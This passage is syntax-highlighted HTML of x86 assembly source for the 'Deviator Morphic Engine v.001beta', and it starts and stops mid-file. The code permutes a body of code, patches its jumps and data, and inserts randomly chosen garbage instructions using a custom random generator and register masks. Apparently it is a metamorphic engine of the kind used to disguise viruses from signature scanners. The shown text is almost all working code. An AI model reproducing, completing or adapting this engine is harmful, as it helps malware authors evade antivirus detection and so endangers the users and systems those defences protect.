    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">uExtended</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">data.inc</span><span class="sc0"> </span><span class="sc4">]-----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">xSrc</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xDst</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xBase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xAddOffset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xPos</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">incheck</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RegMask</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">NoGen</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MaxMorph</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">BlockNum</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Datan</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Jmpn</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Tbln</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Blocks</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">MaxBlocks</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Jumps</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">MaxJumps</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Datas</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">MaxData</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Tbls</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">MaxTbls</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Dme.inc</span><span class="sc0"> </span><span class="sc4">]-----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Deviator Morphic Engine v.001beta</span><span class="sc0">

</span><span class="sc1">; Input</span><span class="sc0">
</span><span class="sc1">; ESi - Entry Point Src (with zero end)</span><span class="sc0">
</span><span class="sc1">; EDi - Dst</span><span class="sc0">
</span><span class="sc1">; EBX - ImageBase of code</span><span class="sc0">
</span><span class="sc1">; EDX - Offset to code</span><span class="sc0">
</span><span class="sc1">; ECX - Size of all code (including variables)</span><span class="sc0">
</span><span class="sc1">; EAX - Offset to some variable</span><span class="sc0">

</span><span class="sc1">; Output</span><span class="sc0">
</span><span class="sc1">; ECX - New Size</span><span class="sc0">
</span><span class="sc1">; EDi - is filled with permutated code</span><span class="sc0">
</span><span class="sc1">; EAX - New offset of variable</span><span class="sc0">

</span><span class="sc5">DME</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MaxMorph</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Max Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xDst</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xBase</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xSrc</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xAddOffset</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">incheck</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Datan</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tbln</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GarbLvl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">UserProc_InitTables</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc5">DoMorph</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Morphed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Analyse</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckBlocks</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DoMorph</span><span class="sc0">
</span><span class="sc5">Morphed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">G_Jxx</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">xSrc</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">xDst</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Morph</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PatchJumps</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PatchData</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PatchTblData</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xAddOffset</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DME</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">a.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">blocks.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">morph.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">disasmer.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">jumps.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pdata.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">tables.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mutate.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">garble.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">user.inc</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">dme.tbl</span><span class="sc0"> </span><span class="sc4">]-----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; a.inc</span><span class="sc0">
</span><span class="sc1">;  none.</span><span class="sc0">
</span><span class="sc1">; api.inc</span><span class="sc0">
</span><span class="sc1">;  none.</span><span class="sc0">
</span><span class="sc1">; disasmer.inc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetSize16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">uExtended</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">XData</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return7</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5addr</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Repzz</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Grp1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Grp2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex4</span><span class="sc0">
</span><span class="sc1">; pdata.inc</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DataReturn1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xOpcode</span><span class="sc0">
</span><span class="sc1">; mutate.inc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_ShortJmp</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_ShortJmp2</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Loop</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_CheckZero</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_MovZero</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Xchg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Inc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Dec</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TryIncDec</span><span class="sc0">
</span><span class="sc1">; garbage.inc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetMask</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FreeMask</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetNotFreeReg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetReg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CheckReg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetRegNum</span><span class="sc0">

    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_XchgEax</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_PushPop</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_Nop</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_MovRegImm</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_MovRegReg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_GenJxx</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Garble.inc</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">-------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">MaxGarb</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Last</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DoGarble</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GarbLvl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">MaxGarb</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoGarb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GarbLvl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WLast</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GarbLen</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Last</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">WLast</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Last</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GarbTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">NoGarb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoGarble</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">randseed</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7824F38Ch</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">randseed</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoDiv</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">NoDiv</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">randseed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">22312345h</span><span class="sc0">
</span><span class="sc1">;--------------------</span><span class="sc0">
</span><span class="sc5">GetAnyReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAnyReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CheckReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckReg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetNotFreeReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetRegNum</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetF</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">GetF</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">GetF</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetNotFreeReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetReg</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetRegNum</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoReg</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ChooseReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ChooseReg</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">RetReg</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetReg</span><span class="sc0">

</span><span class="sc5">RetReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
